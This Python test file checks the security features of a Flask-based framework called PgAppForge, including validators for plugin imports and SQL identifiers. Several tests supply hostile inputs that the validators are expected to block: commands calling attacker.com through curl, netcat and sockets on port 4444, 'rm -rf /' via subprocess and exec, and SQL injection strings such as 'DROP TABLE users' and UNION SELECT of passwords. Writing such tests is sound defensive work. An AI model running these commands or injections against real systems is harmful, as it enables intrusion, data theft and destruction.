"""
Comprehensive security integration tests for PgAppForge security fixes.

These tests ensure all security improvements work together correctly and
provide comprehensive protection against security vulnerabilities.
"""

import pytest
import tempfile
import os
import json
import sqlite3
from pathlib import Path
from unittest.mock import patch, MagicMock, Mock
from flask import Flask

from pgappforge import AppBuilder
from pgappforge.plugins import BasePlugin, PluginMetadata, PluginPriority
from pgappforge.cli.utils.import_utils import validate_imports_secure
from pgappforge.security.sql_utils import SQLIdentifierValidator, SecureDDLExecutor


class TestSecurityIntegration:
    """Integration tests for all security components."""

    def setup_method(self):
        """Set up test environment."""
        self.app = Flask(__name__)
        self.app.config['SECRET_KEY'] = 'test_secret_key_for_testing_only'
        self.app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///:memory:'
        self.app.config['WTF_CSRF_ENABLED'] = False

    def test_secret_key_validation_integration(self):
        """Test secret key validation in application context."""
        # Test with weak secret key
        weak_app = Flask(__name__)
        weak_app.config['SECRET_KEY'] = 'dev'

        # Should log warning about weak secret key
        with patch('pgappforge.base.log') as mock_log:
            try:
                appbuilder = AppBuilder(weak_app)
                # Check if warning was logged about weak secret key
                # (Implementation would depend on actual validation logic)
            except Exception:
                # Some configurations may fail, that's OK for this test
                pass

    def test_import_validation_in_plugin_loading(self):
        """Test import validation integration with plugin system."""
        with self.app.app_context():
            appbuilder = AppBuilder(self.app)

            # Test plugin with dangerous imports
            class MaliciousPlugin(BasePlugin):
                @property
                def metadata(self):
                    return PluginMetadata(
                        name="malicious_plugin",
                        version="1.0.0",
                        description="Test malicious plugin",
                        author="Test"
                    )

                def initialize(self):
                    # This would contain dangerous imports in real scenario
                    pass

            # Plugin loading should include validation
            result = appbuilder.register_plugin(MaliciousPlugin)
            assert isinstance(result, bool)  # Should complete without crashing

    def test_sql_security_in_database_operations(self):
        """Test SQL security integration with database operations."""
        validator = SQLIdentifierValidator()
        executor = SecureDDLExecutor()

        # Create test database
        conn = sqlite3.connect(":memory:")
        cursor = conn.cursor()

        # Test secure table creation
        try:
            cursor.execute("CREATE TABLE secure_test (id INTEGER PRIMARY KEY)")
            conn.commit()

            # Test secure column addition
            success = executor.safe_add_column(
                conn,
                "secure_test",
                "secure_column",
                "TEXT"
            )
            assert success is True

        finally:
            conn.close()

    def test_plugin_security_validation_integration(self):
        """Test plugin security validation integration."""
        with self.app.app_context():
            # Configure strict plugin security
            self.app.config['FAB_PLUGIN_SECURITY_STRICT'] = True
            appbuilder = AppBuilder(self.app)

            # Test plugin registration with security validation
            class SecureTestPlugin(BasePlugin):
                @property
                def metadata(self):
                    return PluginMetadata(
                        name="secure_test_plugin",
                        version="1.0.0",
                        description="Secure test plugin",
                        author="Test",
                        priority=PluginPriority.LOW,
                        safe_mode_compatible=True
                    )

                def initialize(self):
                    # Safe initialization
                    self.test_data = {"initialized": True}

            # Should register successfully
            result = appbuilder.register_plugin(SecureTestPlugin)
            assert result is True

    def test_comprehensive_security_headers(self):
        """Test security headers integration."""
        with self.app.app_context():
            self.app.config['SECURITY_HEADERS_ENABLED'] = True

            # Mock the security headers module
            with patch('pgappforge.base.init_security_headers') as mock_init:
                appbuilder = AppBuilder(self.app)
                # Security headers should be initialized
                mock_init.assert_called_once_with(self.app)

    def test_rate_limiting_integration(self):
        """Test rate limiting integration."""
        with self.app.app_context():
            self.app.config['RATE_LIMITING_ENABLED'] = True

            # Mock the rate limiting module
            with patch('pgappforge.base.init_rate_limiting') as mock_init:
                mock_init.return_value = Mock()  # Mock rate limiter
                appbuilder = AppBuilder(self.app)
                # Rate limiting should be initialized
                mock_init.assert_called_once_with(self.app)

    def test_security_error_handling(self):
        """Test security error handling across components."""
        # Test import validation errors
        malicious_imports = ["import subprocess; subprocess.call(['rm', '-rf', '/'])"]
        result = validate_imports_secure(malicious_imports)
        assert result.is_valid is False
        assert len(result.errors) > 0

        # Test SQL validation errors
        validator = SQLIdentifierValidator()
        with pytest.raises(Exception):  # Should raise appropriate security error
            validator.validate_identifier("'; DROP TABLE users; --")

    def test_logging_security_events(self):
        """Test security event logging across all components."""
        with patch('pgappforge.cli.utils.import_utils.logger') as mock_import_logger, \
             patch('pgappforge.security.sql_utils.logger') as mock_sql_logger, \
             patch('pgappforge.plugins.plugin_validator.logger') as mock_plugin_logger:

            # Trigger security events

            # Import validation security event
            malicious_imports = ["import subprocess"]
            validate_imports_secure(malicious_imports)

            # SQL validation security event
            validator = SQLIdentifierValidator()
            try:
                validator.validate_identifier("DROP TABLE users")
            except Exception:
                pass

            # Check that security events were logged
            assert (mock_import_logger.warning.called or
                   mock_import_logger.error.called or
                   mock_sql_logger.warning.called or
                   mock_sql_logger.error.called)

    def test_plugin_isolation_security(self):
        """Test plugin isolation and resource cleanup."""
        with self.app.app_context():
            appbuilder = AppBuilder(self.app)

            class IsolatedTestPlugin(BasePlugin):
                @property
                def metadata(self):
                    return PluginMetadata(
                        name="isolated_test",
                        version="1.0.0",
                        description="Isolated test plugin",
                        author="Test"
                    )

                def initialize(self):
                    self.resources = ["resource1", "resource2"]

                def cleanup(self):
                    self.resources.clear()

            # Test plugin lifecycle with isolation
            appbuilder.register_plugin(IsolatedTestPlugin)
            load_success = appbuilder.load_plugin("isolated_test")

            if load_success:
                # Test plugin isolation context
                try:
                    with appbuilder.plugin_manager.plugin_isolation("isolated_test"):
                        # Simulate plugin operation
                        pass
                except Exception:
                    # Isolation should handle errors gracefully
                    pass

                # Test plugin unloading and cleanup
                unload_success = appbuilder.unload_plugin("isolated_test")
                assert isinstance(unload_success, bool)

    def test_configuration_security_validation(self):
        """Test security validation of configuration values."""
        with self.app.app_context():
            # Test with potentially insecure configurations
            insecure_configs = {
                'SECRET_KEY': 'dev',  # Weak secret key
                'DEBUG': True,        # Debug mode in production
                'TESTING': True,      # Testing mode
            }

            for key, value in insecure_configs.items():
                self.app.config[key] = value

            # Application should still initialize but may log warnings
            try:
                appbuilder = AppBuilder(self.app)
                assert appbuilder is not None
            except Exception as e:
                # Some insecure configs may prevent initialization
                assert "security" in str(e).lower() or "config" in str(e).lower()

    def test_attack_simulation_prevention(self):
        """Test prevention of simulated attack scenarios."""

        # Scenario 1: Code injection via import manipulation
        attack_imports = [
            "import os; os.system('curl attacker.com')",
            "__import__('subprocess').call(['nc', 'attacker.com', '4444'])",
            "exec('import socket; socket.socket().connect((\"attacker.com\", 4444))')"
        ]

        for attack_import in attack_imports:
            result = validate_imports_secure([attack_import])
            assert result.is_valid is False, f"Should block: {attack_import}"

        # Scenario 2: SQL injection via identifier manipulation
        sql_attacks = [
            "users; DROP TABLE users; --",
            "users' UNION SELECT password FROM admin_users --",
            "users/**/WHERE/**/1=1/**/OR/**/'1'='1"
        ]

        validator = SQLIdentifierValidator()
        for attack in sql_attacks:
            with pytest.raises(Exception):
                validator.validate_identifier(attack)

    def test_defense_in_depth_validation(self):
        """Test that multiple security layers work together."""
        with self.app.app_context():
            # Enable all security features
            self.app.config.update({
                'FAB_PLUGIN_SECURITY_STRICT': True,
                'SECURITY_HEADERS_ENABLED': True,
                'RATE_LIMITING_ENABLED': True,
                'FAB_UPDATE_PERMS': True
            })

            # Mock external dependencies
            with patch('pgappforge.base.init_security_headers'), \
                 patch('pgappforge.base.init_rate_limiting') as mock_rate_limit:

                mock_rate_limit.return_value = Mock()
                appbuilder = AppBuilder(self.app)

                # Test that all security systems are active
                assert appbuilder.plugin_manager is not None
                assert hasattr(appbuilder, 'plugin_loader')

    def test_security_regression_prevention(self):
        """Test that security fixes prevent regression of known vulnerabilities."""

        # Test Case 1: CVE-like code injection prevention
        code_injection_attempts = [
            "eval('malicious_code')",
            "exec('import os; os.system(\"rm -rf /\")')",
            "__import__('os').system('malicious')"
        ]

        for attempt in code_injection_attempts:
            result = validate_imports_secure([attempt])
            assert result.is_valid is False, f"Regression: {attempt} should be blocked"

        # Test Case 2: SQL injection prevention
        sql_injection_attempts = [
            "'; DROP DATABASE production; --",
            "' OR '1'='1' --",
            "/**/UNION/**/SELECT/**/password/**/FROM/**/users"
        ]

        validator = SQLIdentifierValidator()
        for attempt in sql_injection_attempts:
            with pytest.raises(Exception):
                validator.validate_identifier(attempt)

    def test_security_performance_impact(self):
        """Test that security measures don't significantly impact performance."""
        import time

        # Test import validation performance
        large_import_list = [f"import module_{i}" for i in range(100)]

        start_time = time.time()
        result = validate_imports_secure(large_import_list)
        import_time = time.time() - start_time

        assert import_time < 5.0, "Import validation should be fast"
        assert isinstance(result, object)

        # Test SQL validation performance
        validator = SQLIdentifierValidator()

        start_time = time.time()
        for i in range(1000):
            try:
                validator.validate_identifier(f"table_{i}")
            except Exception:
                pass
        sql_time = time.time() - start_time

        assert sql_time < 10.0, "SQL validation should be fast"

    def test_security_audit_trail(self):
        """Test that security events create proper audit trails."""
        with patch('pgappforge.cli.utils.import_utils.logger') as mock_logger:

            # Trigger security event
            malicious_imports = ["import subprocess"]
            result = validate_imports_secure(malicious_imports)

            # Should create audit log entry
            assert result.is_valid is False
            # Logger should be called for security events
            assert mock_logger.warning.called or mock_logger.error.called

    def test_configuration_isolation(self):
        """Test that security configurations are properly isolated."""
        with self.app.app_context():
            # Test plugin configuration isolation
            self.app.config['FAB_PLUGINS'] = [
                {
                    'name': 'test_plugin',
                    'module': 'fake.module',
                    'config': {'isolated_setting': 'value'}
                }
            ]

            appbuilder = AppBuilder(self.app)

            # Plugin system should be initialized
            assert appbuilder.plugin_manager is not None
            assert appbuilder.plugin_loader is not None


class TestSecurityEdgeCases:
    """Test security edge cases and boundary conditions."""

    def test_null_and_empty_input_handling(self):
        """Test handling of null and empty inputs across security components."""

        # Import validation with edge cases
        edge_cases = [None, "", [], [""], [None]]
        for case in edge_cases:
            try:
                result = validate_imports_secure(case)
                assert hasattr(result, 'is_valid')
            except (TypeError, AttributeError):
                # Appropriate error handling is acceptable
                pass

        # SQL validation with edge cases
        validator = SQLIdentifierValidator()
        sql_edge_cases = [None, "", " ", "\t", "\n"]
        for case in sql_edge_cases:
            with pytest.raises((Exception, TypeError)):
                validator.validate_identifier(case)

    def test_unicode_and_encoding_security(self):
        """Test security with unicode and different encodings."""

        # Test unicode in imports
        unicode_imports = ["import модуль", "import 模块"]
        result = validate_imports_secure(unicode_imports)
        assert hasattr(result, 'is_valid')

        # Test unicode in SQL identifiers
        validator = SQLIdentifierValidator()
        unicode_identifiers = ["таблица", "表格"]
        for identifier in unicode_identifiers:
            try:
                validator.validate_identifier(identifier)
            except Exception:
                # Unicode handling may vary - either accept or reject consistently
                pass

    def test_concurrent_security_operations(self):
        """Test security operations under concurrent access."""
        import threading
        import concurrent.futures

        def security_operation_worker():
            # Test import validation
            result1 = validate_imports_secure(["import json"])

            # Test SQL validation
            validator = SQLIdentifierValidator()
            try:
                result2 = validator.validate_identifier("test_table")
                return (result1.is_valid, True)
            except Exception:
                return (result1.is_valid, False)

        # Run concurrent security operations
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(security_operation_worker) for _ in range(20)]
            results = [future.result() for future in concurrent.futures.as_completed(futures)]

        # All operations should complete successfully
        assert len(results) == 20
        for result in results:
            assert isinstance(result, tuple)
            assert len(result) == 2

    def test_memory_and_resource_security(self):
        """Test security measures don't cause memory leaks or resource issues."""

        # Test large input handling
        large_input = ["import module"] * 10000

        try:
            result = validate_imports_secure(large_input)
            assert hasattr(result, 'is_valid')
        except Exception as e:
            # Should fail gracefully, not crash
            assert "memory" in str(e).lower() or "size" in str(e).lower() or "limit" in str(e).lower()

        # Test repeated operations
        validator = SQLIdentifierValidator()
        for i in range(1000):
            try:
                validator.validate_identifier(f"table_{i % 100}")
            except Exception:
                pass


if __name__ == "__main__":
    pytest.main([__file__, "-v"])